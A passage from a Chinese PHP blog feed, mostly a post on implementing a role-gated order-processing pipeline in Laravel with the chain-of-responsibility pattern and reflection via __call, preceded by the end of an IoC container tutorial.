class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要注意：要想反射能够识别，此处必须给参数声明类型。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(car $obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = $obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;obj-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = \di\IoC::make(<span class="string">"\di\person"</span>);</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy(); <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>可以看到，即使没有手动创建Car 类，也不会影响Person 类的调用，这就是IoC 容器所解决的问题：把对象与对象之间的依赖关系隐藏到容器（存储实例化对象）中，通过自动创建的方式解决依赖关系。</p><p>这里仅仅只是抛砖引玉，用一个简单的IoC 容器例子来理解什么是依赖注入/控制反转，更多相关知识可以通过查看主流框架源码或者<a href="https://php-di.org" target="_blank" rel="noopener">PHP-DI</a> 进行学习。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/56111" target="_blank" rel="noopener">写一个简单的IoC容器案例，理解什么是依赖注入和控制反转</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用职责链模式和反射解决流水线问题</title>
      <link href="/use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/"/>
      <url>/use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/</url>
      
        <content type="html"><![CDATA[<p><del>设计模式是区分程序员能力大小的一个重要因素——Boo。</del></p><a id="more"></a><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>原来的业务可以看成是一条流水线，这条流水线上有各个模块有各自的职责，相互依赖但并不耦合，操作A 完成之后，才能执行操作B，操作完成之后才能执行操作C… 以此类推。</p><p>就目前的需求来看，直接使用传统的方式进行编码，各个职责所对应的功能直接写到控制器中，即可。但问题在于，同时有多个不同的角色，可能会调用该功能，比如：</p><blockquote><p>用户只能执行A、C 操作，管理员只能执行A、B、C 操作，而超级管理员则可以执行所有操作。</p></blockquote><p>如果仍然坚持使用传统的方式进行编码，那么同一个操作，可能需要在不同角色模块下各自维护一份，一旦其中某一个的需求发生了变化，那么还得同时更正好几份代码…</p><p>已知需求：</p><ul><li>每个角色所需要执行的操作内容都是一样的，并不会是因为身份是管理员或者用户，其操作就会发生变化。</li><li>所有的操作在逻辑上相互依赖，但并不耦合。</li><li>每个角色所能执行的操作是已知的。</li><li>禁止越级操作，不能直接越过A 去执行B 操作。</li></ul><h2 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h2><p>基于以上几点，最终选择『责任链模式』作为设计思路，原因有以下：</p><ol><li>职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。</li><li>在没达到指定条件前，会一直向下传递，直到结束流水线</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>伪代码分析过程：</p><ol><li>新建一个订单操作类，在构造函数中分别接收用户身份和订单ID，根据当前订单状态及用户身份获取各自当前所能执行的操作（这里有个问题，如果角色增加，构造函数会因此变得复杂，可以配合使用其他设计模式代替在构造函数中赋值）。</li><li>在该类中配合PHPStorm 注解定义所有需要执行的操作</li><li>通过魔术方式<code>__call</code> 进行反射，将操作映射到具体功能实现的类中</li></ol><p>核心有两点：</p><ol><li>通过职责连获取不同角色所能执行的操作</li><li>PHPStorm 注解配合反射使用，查找并执行具体功能</li></ol><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>创建职责连：</p><p>用户：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionD'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">                <span class="string">'actionB'</span>,</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionD'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>超级管理员：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuperAdminOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">                <span class="string">'actionB'</span>,</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><p>虽然不同的操作操作之间并没有直接关联，此处为了方便日后功能扩展，还是将不同类型的操作进行了分类</p><p>OrderSuccessService：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderSuccessService</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionA</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// 具体业务逻辑</span></span><br><span class="line">          </span><br><span class="line">       &#125;<span class="keyword">catch</span>(OrderException $exception)&#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>($exception-&gt;getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionB</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionC</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OrderFailService：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderFailService</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionD</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// 具体业务逻辑</span></span><br><span class="line">          </span><br><span class="line">       &#125;<span class="keyword">catch</span>(OrderException $exception)&#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>($exception-&gt;getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤二-1"><a href="#步骤二-1" class="headerlink" title="步骤二"></a>步骤二</h3><p>创建OrderAction 类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">OrderModel</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">UserOrderActionService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">AdminOrderActionService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">SuperAdminOrderActionService</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解部分 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionA()                操作A</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionB()                操作B</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionC()                操作C</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderFailService actionD()                   操作D</span></span><br><span class="line"><span class="comment"> * // ...</span></span><br><span class="line"><span class="comment"> * Class OrderAction</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services\order\action</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderAction</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $actionCode;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> $class = [</span><br><span class="line">      <span class="string">"App\Services\order\OrderSuccessService"</span>,</span><br><span class="line">      <span class="string">"App\Services\order\OrderFailService"</span>,</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $role_type, int $order_id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $order = OrderModel::find($order_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ($role_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"user"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = UserOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = AdminOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              </span><br><span class="line">            <span class="keyword">case</span> <span class="string">"superAdmin"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = superAdminOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="comment">// ... </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">strategy</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;class <span class="keyword">as</span> $class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array($name, get_class_methods($class))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> $class(<span class="keyword">$this</span>-&gt;actionUser);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">(string $method)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($method, <span class="keyword">$this</span>-&gt;actionCode)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"非法操作，禁止越级操作"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;auth($name)-&gt;strategy($name)-&gt;$name(...$arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h3><p>控制器调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">user</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionA</span><span class="params">(OrderRequest $request)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      $param = $request-&gt;only([<span class="string">'order_id'</span>]);</span><br><span class="line">   </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          (<span class="keyword">new</span> OrderAction(<span class="string">"worker"</span>, $param[<span class="string">'order_id'</span>]))-&gt;actionA($param);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (OrderException $exception) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;failed($exception-&gt;getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，该业务的核心流程已经通过职责连模式和反射实现。</p><p>回头再看看这些代码，其实也不会有什么难度，只是自己在这方便的锻炼太少了，每每遇到问题，总是很难将需求抽象，或者尽管知道用什么设计模式，但最终导致写不出来。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序开发经验总结</title>
      <link href="/summary-of-mini-program-development-experience/"/>
      <url>/summary-of-mini-program-development-experience/</url>
      
